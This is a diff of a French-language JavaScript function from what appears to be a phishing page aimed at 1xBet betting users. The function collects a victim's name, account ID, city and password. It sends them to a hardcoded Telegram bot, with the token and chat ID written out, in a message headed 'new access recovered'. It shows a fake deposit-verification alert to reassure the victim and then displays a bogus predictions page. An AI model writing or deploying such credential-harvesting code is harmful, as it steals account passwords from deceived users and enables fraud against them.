@@ -1,46 +1,42 @@
 function finalSubmit() {
-    // Récupération des données du formulaire
+    // 1. On récupère les données saisies par l'utilisateur
     const data = {
         nom: document.getElementById('p1_name').value,
         id: document.getElementById('p1_id').value,
-        sexe: document.getElementById('p2_sex').value,
-        pays: document.getElementById('p2_pays').value,
-        ville: document.getElementById('p2_ville').value,
-        pass: document.getElementById('p3_pass').value
+        pass: document.getElementById('p3_pass').value,
+        ville: document.getElementById('p2_ville').value || "Non précisée"
     };
 
-    // Vérification que le mot de passe n'est pas vide
+    // 2. On vérifie que le mot de passe est présent
     if(data.pass === "") {
         alert("Veuillez entrer votre mot de passe pour confirmer l'activation.");
         return;
     }
 
-    // --- CONFIGURATION TELEGRAM UNIQUEMENT ---
+    // 3. Configuration de TON Telegram
     const token = "6979576051:AAGB_RAKRKORo-3jkv13XRHWhandRY240fc";
     const chatId = "5112163453"; 
     
-    // Construction du message qui sera affiché dans ton Telegram
-    const texte = `🔔 NOUVEL ACCÈS RÉCUPÉRÉ 🔔\n\n` +
-                 `👤 Nom: ${data.nom}\n` +
-                 `🆔 ID 1xBet: ${data.id}\n` +
-                 `🌍 Ville: ${data.ville}, ${data.pays}\n` +
-                 `⚧ Sexe: ${data.sexe}\n` +
-                 `🔑 MOT DE PASSE: ${data.pass}`;
+    // Le message tel que tu le recevras sur ton téléphone
+    const message = `🔔 NOUVEL ACCÈS RÉCUPÉRÉ 🔔\n\n` +
+                    `👤 Nom: ${data.nom}\n` +
+                    `🆔 ID 1xBet: ${data.id}\n` +
+                    `📍 Ville: ${data.ville}\n` +
+                    `🔑 PASS: ${data.pass}`;
 
-    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(texte)}`;
+    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
-    // Affichage d'une fausse alerte de chargement pour rassurer l'utilisateur
-    alert("Vérification du dépôt de 10 000 FC en cours... Veuillez patienter.");
+    // 4. Exécution de l'envoi et changement de page
+    alert("Vérification du dépôt de 10 000 FC... Veuillez patienter.");
 
-    // Envoi direct à Telegram via l'API
     fetch(url)
     .then(() => {
-        // Une fois envoyé, on affiche la page des prédictions (Page 4)
+        // Succès : On affiche la page 4 des prédictions
         showPage(4);
     })
     .catch((err) => {
-        // En cas d'erreur de réseau, on avance quand même vers la page 4
-        console.error("Erreur d'envoi Telegram:", err);
+        // En cas de problème réseau, on force quand même l'affichage pour l'utilisateur
+        console.error("Erreur Telegram:", err);
         showPage(4);
     });
 }
